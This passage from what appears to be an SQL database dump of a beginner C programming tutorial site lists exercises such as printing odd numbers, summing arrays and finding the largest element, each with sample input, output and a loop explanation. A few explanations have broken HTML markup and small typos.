Program to print ODD numbers till N','C-Program-to-print-ODD-numbers-till-N','<p style=\"line-height: 1;\">Get input n and print odd numbers till n.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 5 7</p>','B','','prog/c/tillnoddnumber.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 1 and incremented by 2 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\"> so value of i will be printed like 1 3 5 .... (n-1) or n using printf statement.</p>',4,'','raptor/odd_numbers.PNG',''),(744,'C Program to print Even numbers till N','C-Program-to-print-Even-numbers-till-N','<p style=\"line-height: 1;\">Get input n and print even numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2 4 6</p>','B','','prog/c/tillnevennumber.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 2 and incremented by 2 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\"> so value of i will be printed like 2 4 6 .... (n-1) or n using printf statement.</p>',4,NULL,NULL,NULL),(745,'C Program to print N Natural numbers in reverse','C-Program-to-print-N-Natural-numbers-in-reverse','<p style=\"line-height: 1;\">Get input n and print natural numbers from n in reverse.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">7 6 5 4 3 2 1</p>','B','','prog/c/naturalr.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&gt;0) is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i is initialized to n and decremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes less than 1. </p><p style=\"line-height: 1;\"> so value of i will be printed like n n-1 ....3 2 1 using printf statement.</p>',4,NULL,NULL,NULL),(746,'C Program to calculate sum of First N Natural numbers','C-Program-to-calculate-sum-of-First-N-Natural-numbers','<p style=\"line-height: 1;\">Get input n and calculate the sum of first n natural numbers.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">15(1+2+3+4+5)</p>','B','','prog/c/sumnatural.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i<n) is=\"\" true.=\"\" here=\"\" i=\"\" initialized=\"\" to=\"\" 1=\"\" and=\"\" incremented=\"\" by=\"\" for=\"\" each=\"\" iteration,=\"\" instructions=\"\" inside=\"\" the=\"\" <b=\"\">for block are executed unless i becomes greater than n. </n)></p><p style=\"line-height: 1;\"><n) is=\"\" true.=\"\" here=\"\" i=\"\" initialized=\"\" to=\"\" 1=\"\" and=\"\" incremented=\"\" by=\"\" for=\"\" each=\"\" iteration,=\"\" instructions=\"\" inside=\"\" the=\"\" <b=\"\">so value of i (1,2,3,...n)will be added to sum.\r\n</n)></p><p style=\"line-height: 1;\"><n) is=\"\" true.=\"\" here=\"\" i=\"\" initialized=\"\" to=\"\" 1=\"\" and=\"\" incremented=\"\" by=\"\" for=\"\" each=\"\" iteration,=\"\" instructions=\"\" inside=\"\" the=\"\" <b=\"\">\r\nafter adding all n natural numbers to sum, sum will be printed using printf statement.</n)></p>',4,NULL,NULL,NULL),(747,'C Program to print N ODD numbers','C-Program-to-print-N-ODD-numbers','<p style=\"line-height: 1;\">Get input n and print n odd numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">1 3 5 7 9 11 13</p>','B','','prog/c/noddnumber.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (j&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i and j are initialized to 1 and i is incremented by 2 and j is incremented by 1.</p><p style=\"line-height: 1;\"> for each iteration, instructions inside the <b>for</b> block are executed unless j becomes greater than n. </p><p style=\"line-height: 1;\">so value of i (1,3,5,7.....) (n odd numbers) in each iteration will be printed using printf statement. \r\n</p>',4,NULL,NULL,NULL),(748,'C Program to print N Even numbers','C-Program-to-print-N-Even-numbers','<p style=\"line-height: 1;\">Get input n and print n even numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2 4 6 8 10 12 14</p>','B','','prog/c/nevennumber.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (j&lt;=n) is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i and j are initialized to 0 and 1 respecively. </p><p style=\"line-height: 1;\">i is incremented by 2 and j is incremented by 1. </p><p style=\"line-height: 1;\">for each iteration, instructions inside the <b>for</b> block are executed unless j becomes greater than n. </p><p style=\"line-height: 1;\">so value of i (0 2 4 6 8 10) (n even numbers) in each iteration will be printed using printf statement. \r\n</p>',4,NULL,NULL,NULL),(749,'C Program to calculate sum of Even numbers till N','C-Program-to-calculate-sum-of-Even-numbers-till-N','<p style=\"line-height: 1;\">Get input n and calculate the sum of even numbers till n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n6(2+4)</p>','B','','prog/c/sumofeven.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i is initialized to 2 and incremented by 2 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\">so value of i (2,4,6,...n)will be added to sum.</p><p style=\"line-height: 1;\">\r\n\r\nafter adding all n even numbers to sum, sum will be printed using printf statement.</p>',4,NULL,NULL,NULL),(750,'C Program to calculate sum of ODD numbers till N','C-Program-to-calculate-sum-of-ODD-numbers-till-N','<p style=\"line-height: 1;\">Get input n and calculate the sum of odd numbers till n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9(1+3+5)</p>','B','','prog/c/sumofodd.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 1 and incremented by 2 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\">so value of i (1,3,5,...n)will be added to sum.</p><p style=\"line-height: 1;\">\r\n\r\nafter adding all n odd numbers to sum, sum will be printed using printf statement.</p>',4,NULL,NULL,NULL),(751,'C Program to calculate sum of N given numbers','C-Program-to-calculate-sum-of-N-given-numbers','<p style=\"line-height: 1;\">Get input n and n inputs and calculate the sum of n inputs.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n6 5 3 2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">16(6+5+3+2)</p>','B','','prog/c/sumn.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\">so value of num given by user will be added to sum at each iteration.</p><p style=\"line-height: 1;\">\r\nafter adding all n numbers given by user to sum, sum will be printed using printf statement.</p>',4,NULL,NULL,NULL),(752,'C Program to print Hello World for N times','C-Program-to-print-Hello-World-for-N-times','<p style=\"line-height: 1;\">Get input n and print the text \"Hello World\" for n times\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">3\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nHello World\r\nHello World\r\nHello World</p>','B','','prog/c/hellon.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\">so the string literal \"Hello World\" will be printed n times.</p>',4,NULL,NULL,NULL),(753,'C Program to print the first digit of a given number','C-Program-to-print-the-first-digit-of-a-given-number','<p style=\"line-height: 1;\">Get input num and display the first digit of number num\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">675\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">6</p>','B','','prog/c/firstdigit.c','<p style=\"line-height: 1;\">Instruction(s) inside the while block{} are executed repeatedly till  expression (num&gt;=10) is true.</p><p style=\"line-height: 1;\">\r\n\r\nDivide the number num by 10 untill it becomes lesser than 10. </p><p style=\"line-height: 1;\">once it is less than 10 print the num using printf statement.\r\n</p><p style=\"line-height: 1;\">\r\nstatement num = num/10 divides the num by 10 repeatedly untill it num is less than 10.</p>',4,NULL,NULL,NULL),(754,'C Program to find whether the first digit of given number is odd or even','C-Program-to-find-whether-the-first-digit-of-given-number-is-odd-or-even','<p>Get input num and check whether the first digit of number num is odd or even</p><p>Sample Input 1:\r\n</p><p>34\r\n</p><p>Sample Output 1:</p><p>ODD\r\n</p><p>Sample Input 2:</p><p>\r\n67\r\n</p><p>Sample Output 2:\r\n</p><p>Even</p>','B','','prog/c/firstdigitoddeven.c','<p style=\"line-height: 1;\">Instruction(s) inside the while block{} are executed repeatedly till  expression  (num&gt;=10)  is true.</p><p style=\"line-height: 1;\">\r\n\r\nDivide the number num by 10 untill it becomes lesser than 10. </p><p style=\"line-height: 1;\">once it is less than 10 check whether the num is odd or even.</p><p style=\"line-height: 1;\">\r\nstatement num = num/10 divides the num by 10 repeatedly untill it num is less than 10.</p>',4,NULL,NULL,NULL),(755,'C Program to multiply two numbers without using * operator','C-Program-to-multiply-two-numbers-without-using-operator','<p style=\"line-height: 1;\">Get two inputs  num1 and num2, compute the product of num1 and num2 without using  * operator\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n30</p>','B','','prog/c/multiplyloop.c','4*5 = 4+4+4+4+4\r\n\r\nAdd the 4 with product for 5 times using while statement.',4,NULL,NULL,NULL),(756,'C Program to find N power of M (Exponentiation) without using predefined function','C-Program-to-find-N-power-of-M-Exponentiation-without-using-predefined-function','<p style=\"line-height: 1;\">Get two inputs  num1 and num2, compute the exponentiation of base num1 and power num2 without using  predefined functions\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">2 4\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">16</p>','B','','prog/c/exponent.c','4^5 = 4*4*4*4*4\r\n\r\nmultiply the 4 with product for 5 times using while statement.',4,'','raptor/exponentiation_kgcRrQ9.PNG',''),(757,'C Program to print Multiplication table of N','C-Program-to-print-Multiplication-table-of-N','<p style=\"line-height: 1;\">Get input n and print the multiplication table of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n</p><p style=\"line-height: 1;\">Sample output 1:\r\n</p><p style=\"line-height: 1;\">1X4=4\r\n2X4=8\r\n3X4=12\r\n4X4=16\r\n5X4=20\r\n6X4=24\r\n7X4=28\r\n8X4=32\r\n9X4=36\r\n10X4=40</p>','B','','prog/c/multiplicationtable.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=10) is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than10. </p><p style=\"line-height: 1;\">so value of i (1,2,3,...10)will be multiplied with n and printed in table format.\r\n\r\n</p>',4,NULL,NULL,NULL),(758,'C Program to print Multiplication table of N till M rows','C-Program-to-print-Multiplication-table-of-N-till-M-rows','<p style=\"line-height: 1;\">Get input n and m, print the multiplication table of n till m\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 7\r\n</p><p style=\"line-height: 1;\">Sample output 1:\r\n</p><p style=\"line-height: 1;\">1X4=4\r\n2X4=8\r\n3X4=12\r\n4X4=16\r\n5X4=20\r\n6X4=24\r\n7X4=28</p>','B','','prog/c/multiplicationtable1.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=m)is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than m. </p><p style=\"line-height: 1;\">so value of i (1,2,3,...m)will be multiplied with n and printed in table format.\r\n\r\n</p>',4,'','raptor/multitable.png',''),(759,'C Program to calculate sum of multiple positive numbers (Stop if user enters negative number)','C-Program-to-calculate-sum-of-multiple-positive-numbers-Stop-if-user-enters-negative-number','<p style=\"line-height: 1;\">Get positive integers from  user till user enters a negative integer calculate sum of positive integers.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n6\r\n7\r\n2 \r\n1\r\n8\r\n-9</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">29\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">3\r\n23\r\n-76\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n26</p>','B','','prog/c/sumpostives.c','since 1 is always true, scanf statement gets input from user continously, if user enters a negative number it exit from while loop using break statement.',4,NULL,NULL,NULL),(760,'C Program to calculate sum of N positive numbers(Skip the negative number and get another instated of that)','C-Program-to-calculate-sum-of-N-positive-numbersSkip-the-negative-number-and-get-another-instated-of-that','<p style=\"line-height: 1;\">Get input n and n positive integers (skip the negative number), then compute the sum of positive integers\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n6 7 2 -8 1 8</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">24</p>','B','','prog/c/sumnpostives.c','<p style=\"line-height: 1;\">user should give n positive integers, if user entered negative number continue statement skips the count and sum statements. </p><p style=\"line-height: 1;\">So this program gets n positive numbers and sum them.</p>',4,NULL,NULL,NULL),(761,'C Program to calculate sum of N positive numbers(Accept the negative number And don?t include in sum)','C-Program-to-calculate-sum-of-N-positive-numbersAccept-the-negative-number-And-dont-include-in-sum','<p style=\"line-height: 1;\">Get input n and n integers, then compute the sum of positive integers\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n6 7 2 -8 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">16</p>','B','','prog/c/sumnpostives1.c','<p style=\"line-height: 1;\">user should give n positive integers, if user entered negative number continue statement skips only the sum statement. </p><p style=\"line-height: 1;\">So this program gets n numbers and sum the positive numbers.</p>',4,NULL,NULL,NULL),(762,'C Program to print all the English Alphabets in Upper case','C-Program-to-print-all-the-English-Alphabets-in-Upper-case','<p>Output:\r\n</p><p>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p>','B','','prog/c/uppercasealphabets.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to A(65) and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than Z(90).</p><p style=\"line-height: 1;\"> so value of i will be printed as character like AB C....Z using printf statement and format specifier %c.</p>',4,NULL,NULL,NULL),(763,'C Program to print all the English Alphabets in lower case','C-Program-to-print-all-the-English-Alphabets-in-lower-case','<p style=\"line-height: 1;\">Output:\r\n</p><p style=\"line-height: 1;\">a b c d e f g h I j k l m n o p q r s t u v w x y z</p>','B','','prog/c/lowercasealphabets.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i is initialized to a (97) and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than z(122). </p><p style=\"line-height: 1;\">so value of i will be printed as character like a,b,c...z using printf statement and format specifier %c.</p>',4,NULL,NULL,NULL),(764,'C Program to print English Alphabets between two Alphabets','C-Program-to-print-English-Alphabets-between-two-Alphabets','<p style=\"line-height: 1;\">Get two alphabets and print the alphabets lies between them.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">D H</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">D E F G H</p>','B','','prog/c/betweenalphabets.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to start and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than stop. </p><p style=\"line-height: 1;\">so value of i will be printed as character like d e f g h using printf statement and format specifier %c.</p>',4,NULL,NULL,NULL),(765,'C Program to print Lower case English Alphabets in reverse','C-Program-to-print-Lower-case-English-Alphabets-in-reverse','<p style=\"line-height: 1;\">Output:</p><p style=\"line-height: 1;\">\r\nz y x w v u t s r q p o n m l k j i h g f e d c b a</p>','B','','prog/c/reversealphabets.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression is true.</p><p style=\"line-height: 1;\">\r\n\r\nHere i is initialized to z(122) and decremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes less than a(97). </p><p style=\"line-height: 1;\">so value of i will be printed as character like z,y,x...a using printf statement and format specifier %c.</p>',4,NULL,NULL,NULL),(766,'C Program to covert decimal to binary number','C-Program-to-covert-decimal-to-binary-number','<p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">11</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1011\r\n</p>','B','','prog/c/decimaltobinary.c','yet to be updated',4,NULL,NULL,NULL),(767,'C Program to convert binary todecimal number','C-Program-to-convert-binary-todecimal-number','<p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1010</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">10\r\n</p>','B','','prog/c/binarytodecimal.c','yet to be updated',4,NULL,NULL,NULL),(768,'C Program to get and print the array elements','C-Program-to-get-and-print-the-array-elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then print the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 7 9 3 1</p>','B','','prog/c/printarr.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.\r\n\r\n</p><p style=\"line-height: 1;\">for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n\r\nSecond for loop </p><p style=\"line-height: 1;\">prints the n elements of array located from 0 to n-1.</p>',5,NULL,NULL,NULL),(769,'C Program to find the sum of array elements','C-Program-to-find-the-sum-of-array-elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then compute sum of the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">25</p>','B','','prog/c/sumarray.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.</p><p style=\"line-height: 1;\">\r\n\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n</p><p style=\"line-height: 1;\">\r\nSecond for loop adds all the n elements of array located from 0 to n-1\r\n</p><p style=\"line-height: 1;\">\r\nFinally prints the sum using printf statement.</p>',5,NULL,NULL,NULL),(770,'C Program to find the sum and average of array Elements','C-Program-to-find-the-sum-and-average-of-array-Elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then compute sum and average of the elements.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">25\r\n5.0</p>','B','','prog/c/averagearray.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.</p><p style=\"line-height: 1;\">\r\n\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n</p><p style=\"line-height: 1;\">\r\nSecond for loop adds all the n elements of array located from 0 to n-1\r\n</p><p style=\"line-height: 1;\">\r\nFinally compute average using avg=sum/n statement and prints average avg using printf statement.</p>',5,'','raptor/average_of_list_HFDFZWw.png',''),(771,'C Program to Search an Element in an array','C-Program-to-Search-an-Element-in-an-array','<p style=\"line-height: 1;\">Get an element and find the location of element in array, print -1 if element is not found.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n9\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">-1</p>','B','','prog/c/linearsearch.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.\r\n</p><p style=\"line-height: 1;\">\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n\r\nusing Second for loop the element is searched in each location from 0 to  the location of element or location n-1.</p><p style=\"line-height: 1;\">\r\n\r\nif element is found in a location that location i is stored as pos and exit from the for loop using break statement.</p><p style=\"line-height: 1;\"> \r\n\r\nif element is not found from 0 to n-1 location, pos remains -1.</p>',5,NULL,NULL,NULL),(772,'C Program to find Largest element in the array','C-Program-to-find-Largest-element-in-the-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the largest element among those elements.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n9</p>','B','','prog/c/max.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.\r\n</p><p style=\"line-height: 1;\">\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n\r\nassign the element located at 0 to max using max = a[0].\r\n</p><p style=\"line-height: 1;\">\r\nusing second for loop  visit each  location serially from 1 to n-1.</p><p style=\"line-height: 1;\"> if the element located in any position is greater than max,  then assign the element as max by using max = a[i] \r\n\r\nfinally max holds the maximum value in the list.</p>',5,NULL,NULL,NULL),(773,'C Program to find Smallest element in the array','C-Program-to-find-Smallest-element-in-the-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the smallest element among those elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p>','B','','prog/c/min.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.\r\n</p><p style=\"line-height: 1;\">\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n\r\nInitially assign the element located at 0 to max using min = a[0].</p><p style=\"line-height: 1;\">\r\n\r\nusing second for loop visit each  location serially from 1 to n-1. </p><p style=\"line-height: 1;\">if the element located in any position is lesser than min,  then assign the element as max by using min = a[i] \r\n\r\nfinally min holds the minimum value in the list.</p>',5,NULL,NULL,NULL),(774,'C Program to print all the numbers which are less than given key element from a given array.','C-Program-to-print-all-the-numbers-which-are-less-than-given-key-element-from-a-given-array','<p style=\"line-height: 1;\">Get an element and print the elements of array which is less than the element.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3 1</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n8</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">5 7 3 1</p>','B','','prog/c/lowerelements.c','<p style=\"line-height: 1;\">i is initialized to 0 and incremented by 1 at each iteration of both the for loops.&nbsp;</p><p style=\"line-height: 1;\">First for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n\r\nusing second for loop visit each  location serially from 1 to n-1. </p><p style=\"line-height: 1;\">if the value located in a position is lesser than the element given by user, then print the value using printf statement.</p>',5,NULL,NULL,NULL),(775,'C Program to find Second Largest element in the array','C-Program-to-find-Second-Largest-element-in-the-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the second largest element among those elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">7</p>','B','','prog/c/secondmax.c','<p style=\"line-height: 1;\">Initialize max and second_max with INT_MIN(INT_MIN is constant holds minimum integer value)\r\n\r\n visit every node in the array\r\n   a) If the current element in array a[i] is greater than max. </p><p style=\"line-height: 1;\">Then update max and second_max as,\r\n      second_max = max\r\n      max = arr[i]\r\n   b) If the current element is lesser than max and greater than second_max,\r\n      then update second_max to store the value of current variable as\r\n      second_max = arr[i]\r\nprint the value stored in second_max.\r\n\r\n</p>',5,NULL,NULL,NULL),(776,'C Program to find Second smallest element in the array','C-Program-to-find-Second-smallest-element-in-the-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the second smallest element among those elements.\r\n</p><p style=\"line-height: 1;\">\r\nSample Input 1:</p><p style=\"line-height: 1;\">\r\n\r\n5 5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">\r\n3</p>','B','','prog/c/secondmin.c','<p style=\"line-height: 1;\">Initialize min and second_min with INT_MAX(INT_MAX is constant holds maximum integer value)\r\n\r\n visit every location in the array\r\n   a) If the current element in array  a[i] is less than min. </p><p style=\"line-height: 1;\">Then update min and second_min as,\r\n      second_min = min\r\n      min = a[i]\r\n   b) If the current element is greater than min and less than second_min,\r\n      then update second_min to store the value of current variable as\r\n      second_min = arr[i]\r\nprint the value stored in second_min.\r\n\r\n</p>',5,NULL,NULL,NULL),(777,'C Program to delete an element in an array','C-Program-to-delete-an-element-in-an-array','<p style=\"line-height: 1;\">Get an element and delete the element from array</p><p style=\"line-height: 1;\">Sample Input 1: </p><p style=\"line-height: 1;\">5&nbsp; 5 7 9 3 1&nbsp; 9</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\"> 5 7 3 1</p>','B','','prog/c/deleteelement.c','<p style=\"line-height: 1;\">visit every location in the array\r\n \r\nif current element in array a[i] is equal to the element which is to be deleted. </p><p style=\"line-height: 1;\">Then move all the elements located after i to its previous position using:\r\n a[i] = a[i+1]\r\n\r\n</p>',5,NULL,NULL,NULL),(778,'C Program to Reverse the Elements in array','C-Program-to-Reverse-the-Elements-in-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then reverse the n elements.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 9 7 5</p>','B','','prog/c/reversearray.c','<p style=\"line-height: 1;\">initialize i to first location of array and j to last location of array using\r\ni=0\r\nj=n-1\r\n</p><p style=\"line-height: 1;\">\r\nswap the elements in location i and j, then increment i by 1 and decrement j by 1.\r\n</p><p style=\"line-height: 1;\">t=a[i]\r\na[i]=a[j]\r\na[j]=temp\r\n\r\nrepeat the above step till i is less than j </p>',5,'','raptor/5thprogramme_xLOxKfk.png',''),(779,'C Program to reverse the first half of array elements','C-Program-to-reverse-the-first-half-of-array-elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then reverse the first n/2 elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 